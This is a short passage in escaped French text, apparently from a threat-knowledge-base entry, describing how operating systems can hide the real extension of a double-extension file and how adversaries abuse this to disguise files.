          \ \xEAtre cach\xE9e par le syst\xE8me d\u2019exploitation dans le navigateur\
          \ de fichiers (ex : explorer.exe), ainsi que dans tout logiciel configur\xE9\
          \ \xE0 l\u2019aide ou similaire aux politiques du syst\xE8me. (Citation\
          \ : PCMag DoubleExtension)(Citation : SOCPrime DoubleExtension) \n\nLes\
          \ adversaires peuvent abuser des doubles extensions pour tenter de dissimuler\
